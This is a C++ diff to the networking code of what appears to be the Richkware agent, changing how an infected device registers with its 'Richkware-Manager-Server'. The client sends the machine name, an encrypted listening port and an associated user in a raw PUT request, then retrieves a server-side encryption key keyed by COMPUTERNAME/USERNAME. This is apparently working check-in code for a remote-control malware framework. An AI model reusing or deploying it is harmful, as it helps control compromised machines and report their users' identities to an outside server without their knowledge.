@@ -131,7 +131,7 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
 }
 
 
-bool Network::UploadInfoToRMS(const char *serverAddress, const char *port) {
+bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const char *userAssociated) {
     const char *serverPort = server.getPort();
     Crypto crypto(encryptionKey);
 
@@ -141,37 +141,50 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port) {
 
     // encrypt only serverPort because name is used by the server to recognize the device
     std::string serverPortS = crypto.Encrypt(serverPort);
-    Device device = Device(name, serverPortS);
+    //Device device = Device(name, serverPortS);
+    //std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
 
-    std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
+    std::string userAssociatedS = crypto.Encrypt(userAssociated);
 
-    RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" + deviceStr + " HTTP/1.1\r\n"
-            "Host: " + serverAddress + "\r\n" +
-                                     "Connection: close\r\n" +
-                                     "\r\n").c_str());
+    std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
+                                "&data1=" + serverPortS +
+                                "&data2=" + userAssociatedS +
+                                " HTTP/1.1\r\n" +
+                                "Host: " + serverAddress + "\r\n" +
+                                "Connection: close\r\n" +
+                                "\r\n";
+
+    RawRequest(serverAddress, port, packet.c_str());
+
     return true;
 }
 
-std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port) {
+std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *userAssociated) {
     Crypto crypto(encryptionKey);
     std::string key = "";
 
     // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
-    UploadInfoToRMS(serverAddress, port);
+    UploadInfoToRMS(serverAddress, port, userAssociated);
 
     // Primary key in RMS database.
     std::string name = getenv("COMPUTERNAME");
     name.append("/");
     name.append(getenv("USERNAME"));
 
-    name = crypto.Encrypt(name);
-    key = RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/GetEncryptionKey?id=" + name + " HTTP/1.1\r\n"
-            "Host: " + serverAddress + "\r\n" +
-                                           "Connection: close\r\n" +
-                                           "\r\n").c_str());
-    key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
-    key = crypto.Decrypt(key);
+    std::string nameS = crypto.Encrypt(name);
 
+    std::string packet = "GET /Richkware-Manager-Server/GetEncryptionKey?id=" + nameS + " HTTP/1.1\r\n"
+            "Host: " + serverAddress + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
+
+    key = RawRequest(serverAddress, port, packet.c_str());
+    // If no matches were found, the function "find" returns string::npos
+    if(key.find('$') !=  std::string::npos) {
+        key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
+        key = crypto.Decrypt(key);
+    }
+    //TODO server error: key not received
     return key;
 }
 
